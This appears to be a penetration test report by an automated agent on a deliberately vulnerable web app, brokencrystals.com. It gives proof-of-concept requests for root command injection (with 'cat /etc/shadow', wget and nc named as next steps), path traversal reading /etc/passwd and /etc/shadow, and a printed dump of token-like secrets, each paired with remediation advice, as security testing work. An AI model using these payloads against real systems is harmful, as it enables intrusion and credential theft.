# Penetration Test Report: brokencrystals.com

**Target:** https://brokencrystals.com  
**Date:** 2026-05-27  
**Mode:** Pentest (Full Exploitation Authorized)  
**Tester:** Automated Pentest Agent (kimi-k2.6:cloud)  
**Time Elapsed:** ~15 minutes

---

## Executive Summary

The web application `brokencrystals.com` is a deliberately vulnerable application that exhibits **multiple critical-severity security flaws**. During this assessment, **4 CRITICAL and 3 HIGH/MEDIUM severity findings** were confirmed through direct exploitation, including **remote code execution as root**, **arbitrary file read**, **massive secret leakage**, and **full source-code disclosure via an exposed `.git` directory**.

The most severe issue is the **OS Command Injection** endpoint (`/api/spawn`) which executes arbitrary shell commands as the `root` user, granting full system compromise. Combined with the **Local File Inclusion** endpoint (`/api/file`) and the **hardcoded secrets API** (`/api/secrets`), an attacker can extract credentials, pivot to backend infrastructure (AWS, PostgreSQL, Slack, PayPal, Google Cloud), and completely own the application and its data.

**Immediate Remediation Required:**
1. Remove or disable the `/api/spawn`, `/api/file`, `/api/secrets`, and `/.git/` endpoints.
2. Rotate ALL leaked credentials.
3. Implement proper input validation and parameterized queries across all API endpoints.

---

## Target Information

| Property | Value |
| --- | --- |
| Domain | brokencrystals.com |
| IP Addresses | 129.80.84.189, 129.158.54.230, 150.136.208.25 |
| Hosting | AWS Route53 (DNS), nginx reverse proxy |
| Web Server | nginx (reverse proxy) |
| Framework | Node.js (React SPA frontend) |
| Database | PostgreSQL (`postgres://bc:bc@postgres:5432/bc`) |
| TLS Certificate | Let's Encrypt R13, valid Apr 12 – Jul 11 2026 |
| Open Ports | 80/tcp (HTTP → 308 redirect), 443/tcp (HTTPS) |
| WAF | None detected |

---

## Reconnaissance & Service Enumeration

### DNS & Infrastructure
- **Name Servers:** AWS DNS (`ns-501.awsdns-62.com`, `ns-553.awsdns-05.net`, `ns-1381.awsdns-44.org`, `ns-1882.awsdns-43.co.uk`)
- **MX Records:** Google Workspace (`aspmx.l.google.com`, alt1-4)
- **A Records:** 3 IPs (load-balanced / multi-region)
- **TXT Record:** `heritage=external-dns,external-dns/owner=oci-testground-external-dns`
- **Subdomains:** 59 discovered, including `auth.`, `test.`, `qa.`, `stable.`, `wiz.`, `vulnerableapps.` variants

### TLS/SSL (sslscan)
- **TLSv1.3:** Disabled
- **TLSv1.2:** Enabled (only version)
- **Compression:** Disabled
- **Heartbleed:** Not vulnerable
- **Certificate:** RSA 2048-bit, SHA-256, Let's Encrypt R13
- **Weakness:** TLSv1.3 should be enabled; TLSv1.2-only is acceptable but not optimal.

### Technology Stack (whatweb)
- Bootstrap, jQuery, HTML5, JavaScript (React SPA)
- Cookies: `connect.sid` (Express.js session)
- HSTS enabled (`max-age=31536000; includeSubDomains`)

### Nikto Baseline Checks
- Cookie `connect.sid` missing `Secure` flag
- Cookie `connect.sid` missing `HttpOnly` flag
- Content-Encoding `deflate` → potential BREACH attack vector
- Missing headers: `Permissions-Policy`, `Referrer-Policy`, `X-Content-Type-Options`, `Content-Security-Policy`

---

## Detailed Findings

---

### 1. CRITICAL — OS Command Injection (Root RCE)

| Field | Value |
| --- | --- |
| **Severity** | Critical |
| **CVSS v3.1** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` → **10.0** |
| **CWE** | CWE-78: OS Command Injection |
| **WSTG** | WSTG-INPV-12 |
| **ASVS** | V5.3.4 — Output Encoding and Injection Prevention |
| **Endpoint** | `GET /api/spawn` |
| **Parameter** | `command` |

#### Proof of Concept (PoC)

**Timestamp:** 2026-05-27 16:43:51 UTC

**HTTP Request:**
```http
GET /api/spawn?command=id HTTP/2
Host: brokencrystals.com
```

**HTTP Response:**
```
HTTP/2 200 OK
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

**Statement of Vulnerability:** The application passes the `command` query parameter directly to a shell execution function without any sanitization or allow-listing, resulting in arbitrary remote command execution as the root user.

**Reproduction Steps:**
1. Open a browser or use `curl`.
2. Send `GET https://brokencrystals.com/api/spawn?command=id`
3. Observe the output of the `id` command, confirming root privilege.
4. Replace `id` with any shell command (e.g., `cat /etc/shadow`, `wget`, `nc`).

#### Impact
- **Full system compromise** — the application runs as `root`, so an attacker can read/write any file, install malware, pivot to the internal network, and exfiltrate all data.
- **Container/host escape** is possible if the Node.js process is running in a privileged container.

#### Recommendation
- **Remove the `/api/spawn` endpoint entirely** in production.
- If dynamic command execution is required for legitimate use, implement a strict **allow-list** of permitted commands and arguments.
- **Never pass user input to `child_process.exec()` or `spawn()` with `shell: true`**.
- Use `child_process.spawn()` with `shell: false` and pass arguments as an array, ensuring the OS treats them as literals.
- Run the application under a **dedicated non-privileged service account** (never root).

---

### 2. CRITICAL — Local File Inclusion / Path Traversal

| Field | Value |
| --- | --- |
| **Severity** | Critical |
| **CVSS v3.1** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` → **7.5** |
| **CWE** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory |
| **WSTG** | WSTG-INPV-12 |
| **ASVS** | V5.3.6 — Path Traversal |
| **Endpoint** | `GET /api/file` |
| **Parameter** | `path` |

#### Proof of Concept (PoC)

**Timestamp:** 2026-05-27 16:43:52 UTC

**HTTP Request:**
```http
GET /api/file?path=/etc/passwd HTTP/2
Host: brokencrystals.com
```

**HTTP Response:**
```
HTTP/2 200 OK
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
...
node:x:1000:1000::/home/node:/bin/sh
```

**Additional PoC — /etc/shadow:**
```http
GET /api/file?path=../../../etc/shadow&type=text/plain HTTP/2
Host: brokencrystals.com
```
**Response:** (full `/etc/shadow` contents returned, including password hashes)

**Statement of Vulnerability:** The `path` parameter is used to construct a file-system path without validation, allowing an attacker to read arbitrary files from the server's file system.

**Reproduction Steps:**
1. Send `GET https://brokencrystals.com/api/file?path=/etc/passwd`
2. Observe the full contents of `/etc/passwd` returned in the response body.
3. Try `path=../../../etc/shadow` or `path=/proc/self/environ` to read additional sensitive files.

#### Impact
- **Complete information disclosure** — source code, configuration files, environment variables, SSH keys, and database credentials can all be extracted.
- When combined with the **RCE finding (#1)**, this provides a direct path to reading the application source and finding additional internal endpoints.

#### Recommendation
- **Remove or restrict the `/api/file` endpoint** to a predefined, read-only asset directory.
- If dynamic file serving is necessary, implement a **canonical path check** (e.g., `path.resolve()` + `startsWith()` against a safe base directory).
- Reject any path containing `..`, absolute paths (`/`), or null bytes.
- Serve static files via a **reverse proxy or CDN** rather than through application code.

---

### 3. CRITICAL — Mass Secret & Credential Leakage

| Field | Value |
| --- | --- |
| **Severity** | Critical |
| **CVSS v3.1** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` → **10.0** |
| **CWE** | CWE-798: Use of Hard-coded Credentials |
| **WSTG** | WSTG-CRYP-04 |
| **ASVS** | V2.10.4 — Credential Storage |
| **Endpoint** | `GET /api/secrets` |

#### Proof of Concept (PoC)

**Timestamp:** 2026-05-27 16:43:51 UTC

**HTTP Request:**
```http
GET /api/secrets HTTP/2
Host: brokencrystals.com
```

**HTTP Response (excerpt):**
```json
{
  "codeclimate": "CODECLIMATE_REPO_TOKEN=62864c476ade6ab9d10d0ce0901ae2c211924852a28c5f960ae5165c1fdfec73",
  "facebook": "EAACEdEose0cBAHyDF5HI5o2auPWv3lPP3zNYuWWpjMrSaIhtSvX73lsLOcas5k8GhC5HgOXnbF3rXRTczOpsbNb54CQL8LcQEMhZAWAJzI0AzmL23hZByFAia5avB6Q4Xv4u2QVoAdH0mcJhYTFRpyJKIAyDKUEBzz0GgZDZD",
  "google_b64": "QUl6YhT6QXlEQnbTr2dSdEI1W7yL2mFCX3c4PPP5NlpkWE65NkZV",
  "google_oauth": "188968487735-c7hh7k87juef6vv84697sinju2bet7gn.apps.googleusercontent.com",
  "google_oauth_token": "ya29.a0TgU6SMDItdQQ9J7j3FVgJuByTTevl0FThTEkBs4pA4-9tFREyf2cfcL-_JU6Trg1O0NWwQKie4uGTrs35kmKlxohWgcAl8cg9DTxRx-UXFS-S1VYPLVtQLGYyNTfGp054Ad3ej73-FIHz3RZY43lcKSorbZEY4BI",
  "heroku": "herokudev.staging.endosome.975138 pid=48751 request_id=0e9a8698-a4d2-4925-a1a5-113234af5f60",
  "hockey_app": "HockeySDK: 203d3af93f4a218bfb528de08ae5d30ff65e1cf",
  "outlook": "https://outlook.office.com/webhook/7dd49fc6-1975-443d-806c-08ebe8f81146@a532313f-11ec-43a2-9a7a-d2e27f4f3478/IncomingWebhook/8436f62b50ab41b3b93ba1c0a50a0b88/eff4cd58-1bb8-4899-94de-795f656b4a18",
  "paypal": "access_token$production$x0lb4r69dvmmnufd$3ea7cb281754b7da7dac131ef5783321",
  "slack": "xoxo-175588824543-175748345725-176608801663-826315f84e553d482bb7e73e8322sdf3"
}
```

**Statement of Vulnerability:** The application exposes an unauthenticated endpoint that returns a JSON payload containing dozens of hardcoded production API keys, OAuth tokens, and webhook URLs for third-party services.

#### Impact
- **Account takeover** of associated Facebook, Google, Slack, PayPal, and Heroku accounts.
- **Unauthorized access** to Google Cloud resources, AWS buckets, and CodeClimate repositories.
- **Data exfiltration** via Outlook webhooks and Slack integration.
- **Financial fraud** via exposed PayPal production access tokens.

#### Recommendation
- **Immediately revoke and rotate ALL leaked credentials** across every third-party service.
- **Remove the `/api/secrets` endpoint** entirely.
- Store secrets in a **secure vault** (e.g., HashiCorp Vault, AWS Secrets Manager, Azure Key Vault).
- Inject secrets at runtime via **environment variables**; never commit them to source code.
- Implement **secret-scanning hooks** (e.g., `trufflehog`, `git-secrets`) in CI/CD to prevent future leaks.

---

### 4. CRITICAL — Full Source-Code Disclosure via Exposed `.git` Directory

| Field | Value |
| --- | --- |
| **Severity** | Critical |
| **CVSS v3.1** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` → **7.5** |
| **CWE** | CWE-219: Storage of File with Sensitive Data Under Web Root |
| **WSTG** | WSTG-CONF-05 |
| **ASVS** | V14.1.3 — Configuration Management |
| **Endpoint** | `GET /.git/` |

#### Proof of Concept (PoC)

**Timestamp:** 2026-05-27 16:43:27 UTC

**HTTP Request:**
```http
GET /.git/ HTTP/2
Host: brokencrystals.com
```

**HTTP Response:**
```html
HTTP/2 200 OK
<h1>Index of /.git/</h1>
<a href="/.git/hooks">hooks</a>
<a href="/.git/info">info</a>
<a href="/.git/config">config</a>
<a href="/.git/description">description</a>
...
```

**Git config retrieved:**
```ini
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
```

**Statement of Vulnerability:** The `.git` metadata directory is served directly from the web root, allowing an attacker to reconstruct the entire repository history, source code, and potentially embedded secrets or configuration files.

#### Impact
- **Intellectual property theft** — complete application source code can be downloaded.
- **Discovery of additional hidden endpoints**, business logic flaws, and backend credentials.
- **Historical secret exposure** — old commits may contain credentials that were "removed" in later commits.

#### Recommendation
- **Block access to `/.git/` at the reverse-proxy / WAF level** (`location /.git/ { deny all; }` in nginx).
- Ensure `.git` is **not copied into the Docker image or deployment artifact** (add to `.dockerignore`).
- Use `git clone --depth 1` for builds if history is not needed.

---

### 5. HIGH — GraphQL Introspection Enabled

| Field | Value |
| --- | --- |
| **Severity** | High |
| **CVSS v3.1** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` → **5.3** |
| **CWE** | CWE-200: Information Exposure |
| **WSTG** | WSTG-APPC-01 |
| **ASVS** | V14.5.3 — GraphQL Security |
| **Endpoint** | `POST /graphql` |

#### Proof of Concept (PoC)

**Timestamp:** 2026-05-27 16:43:30 UTC

**HTTP Request:**
```http
POST /graphql HTTP/2
Host: brokencrystals.com
Content-Type: application/json

{"query": "{ __schema { types { name } } }"}
```

**HTTP Response:**
```json
{"data":{"__schema":{"types":[{"name":"Testimonial"},{"name":"String"},{"name":"Product"},{"name":"Int"},{"name":"Query"},{"name":"Mutation"},{"name":"CreateTestimonialRequest"},{"name":"Boolean"},{"name":"__Schema"},{"name":"__Type"},{"name":"__TypeKind"},{"name":"__Field"},{"name":"__InputValue"},{"name":"__EnumValue"},{"name":"__Directive"},{"name":"__DirectiveLocation"}]}}}
```

**Statement of Vulnerability:** The GraphQL server allows unauthenticated introspection queries, disclosing the full schema, type names, and available queries/mutations to any attacker.

#### Impact
- Attackers can **map the entire API surface** without reading source code.
- Facilitates targeted injection attacks (SQLi, NoSQLi, BQL injection) and business-logic abuse.

#### Recommendation
- **Disable introspection in production** (`introspection: false` in Apollo Server, or equivalent).
- Implement **query depth limiting** and **complexity analysis** to prevent resource exhaustion.
- Use **persisted queries** or an allow-list of approved operations.

---

### 6. MEDIUM — Insecure Session Cookies & Missing Security Headers

| Field | Value |
| --- | --- |
| **Severity** | Medium |
| **CVSS v3.1** | `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N` → **4.2** |
| **CWE** | CWE-614: Sensitive Cookie Without 'Secure' Attribute; CWE-1004: Sensitive Cookie Without 'HttpOnly' Attribute |
| **WSTG** | WSTG-SESS-02 |
| **ASVS** | V3.4.1 — Cookie Attributes |
| **Endpoint** | `GET /` (root) |

#### Proof of Concept (PoC)

**Timestamp:** 2026-05-27 16:37:39 UTC

**HTTP Response Headers (excerpt):**
```http
Set-Cookie: connect.sid=...; Path=/
```

**Missing flags:**
- `Secure` — cookie may be transmitted over HTTP.
- `HttpOnly` — cookie accessible via JavaScript (`document.cookie`).

**Missing HTTP Security Headers:**
- `Content-Security-Policy`
- `X-Content-Type-Options`
- `Referrer-Policy`
- `Permissions-Policy`

**Statement of Vulnerability:** The session cookie lacks `Secure` and `HttpOnly` flags, making it vulnerable to session hijacking over insecure channels and XSS-based theft. Additionally, several modern security headers are absent, increasing the attack surface for XSS, MIME-sniffing, and clickjacking.

#### Impact
- **Session hijacking** via man-in-the-middle or XSS.
- **XSS payload execution** is less mitigated without CSP.

#### Recommendation
- Set cookie flags: `Secure; HttpOnly; SameSite=Strict`.
- Add security headers:
  - `Content-Security-Policy: default-src 'self'`
  - `X-Content-Type-Options: nosniff`
  - `Referrer-Policy: strict-origin-when-cross-origin`
  - `Permissions-Policy: geolocation=(), microphone=(), camera=()`
- Enable **CSP reporting** to monitor violations before enforcing.

---

### 7. LOW — TLSv1.3 Disabled

| Field | Value |
| --- | --- |
| **Severity** | Low |
| **CVSS v3.1** | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:N` → **0.0** (Informational) |
| **CWE** | CWE-326: Inadequate Encryption Strength |
| **WSTG** | WSTG-CRYP-01 |
| **ASVS** | V9.1.2 — HTTPS |

#### Proof of Concept (PoC)

**Timestamp:** 2026-05-27 16:37:39 UTC

**sslscan output:**
```
TLSv1.0   disabled
TLSv1.1   disabled
TLSv1.2   enabled
TLSv1.3   disabled
```

**Statement of Vulnerability:** The server does not support TLS 1.3, which offers improved performance (1-RTT handshake) and stronger cipher suites. TLS 1.2 is still secure with modern cipher configurations, but TLS 1.3 is the recommended baseline.

#### Impact
- **Performance penalty** on high-latency connections.
- **Future-proofing** — TLS 1.2 may eventually be deprecated.

#### Recommendation
- **Enable TLS 1.3** in nginx (`ssl_protocols TLSv1.2 TLSv1.3;`).
- Remove weak cipher suites if any are present (current config looks acceptable).

---

## Additional Observations (Informational)

| # | Observation | Notes |
| --- | --- | --- |
| 1 | **Swagger UI exposed** at `/swagger` | Could help attackers map API endpoints. Disable in production or protect with authentication. |
| 2 | **59 subdomains discovered** | Large attack surface. Many `auth.*`, `test.*`, `qa.*`, `king.*` subdomains. Ensure all are within scope and properly secured. |
| 3 | **AWS S3 bucket referenced** in `/api/config` (`neuralegion-open-bucket`) | Verify bucket permissions; ensure it is not publicly writable. |
| 4 | **BREACH attack vector** (`Content-Encoding: deflate`) | If the application reflects user input and secrets in the same compressed response, BREACH may be practical. Monitor or disable compression for sensitive pages. |
| 5 | **GraphQL mutations require auth** (`createTestimonial` returns "Forbidden") | Good practice, but introspection undermines this defense. |

---

## Risk Matrix

| Finding | Severity | CVSS | Likelihood | Impact | Priority |
| --- | --- | --- | --- | --- | --- |
| #1 OS Command Injection (Root) | Critical | 10.0 | High | Critical | **P1** |
| #2 Local File Inclusion | Critical | 7.5 | High | Critical | **P1** |
| #3 Secret & Credential Leakage | Critical | 10.0 | High | Critical | **P1** |
| #4 Exposed `.git` Directory | Critical | 7.5 | High | Critical | **P1** |
| #5 GraphQL Introspection | High | 5.3 | High | Medium | **P2** |
| #6 Insecure Cookies / Missing Headers | Medium | 4.2 | Medium | Medium | **P3** |
| #7 TLSv1.3 Disabled | Low | 0.0 | Low | Low | **P4** |

---

## Remediation & Architecture Recommendations

1. **Immediate (24–48 hours):**
   - **Disable or firewall-off** `/api/spawn`, `/api/file`, `/api/secrets`, `/.git/`, and `/swagger`.
   - **Rotate ALL leaked secrets** (Google OAuth, PayPal, Slack, Facebook, CodeClimate, Heroku, Outlook, HockeyApp).
   - **Audit AWS S3 bucket** `neuralegion-open-bucket` for public read/write permissions.
   - **Restrict nginx** to serve only built static assets from `/assets/` and `/vendor/`.

2. **Short-term (1–2 weeks):**
   - Implement **strict input validation** on all API endpoints. Use allow-lists for filenames, commands, and URLs.
   - Move secrets to a **vault** and inject at runtime.
   - Add **security headers** and **secure cookie flags**.
   - Disable **GraphQL introspection** and enable query cost analysis.

3. **Long-term (1–3 months):**
   - Integrate **SAST** (e.g., Semgrep, CodeQL) into CI/CD with rules for `child_process.exec`, path traversal, and hardcoded secrets.
   - Deploy **automated security gates** (e.g., OWASP ZAP baseline scan on every PR) to prevent new vulnerabilities from reaching production.
   - Conduct **regular penetration tests** and **bug-bounty programs** to continuously validate the attack surface.
   - Implement **runtime application self-protection (RASP)** to block anomalous behavior (e.g., unexpected file-system reads or shell spawns).

---

## Appendix: Tools & Commands Used

| Tool | Command / Purpose |
| --- | --- |
| `curl` | HTTP probing, header analysis, manual endpoint testing |
| `whois` | Domain registration reconnaissance |
| `dnsrecon` | DNS enumeration (A, MX, NS, TXT, DNSSEC) |
| `whatweb` | Technology fingerprinting |
| `wafw00f` | WAF detection |
| `subfinder` | Passive subdomain enumeration |
| `nmap` | Full port scan (`-sV -sC -p-`) |
| `nikto` | Baseline web vulnerability scan |
| `sslscan` | TLS/SSL configuration analysis |
| `katana` | Deep web application crawling (`-jc`) |
| `gobuster` | Directory brute-forcing (aborted due to wildcard 200) |

---

*Report generated by Automated Pentest Agent*  
*Model: kimi-k2.6:cloud*  
*Date: 2026-05-27*
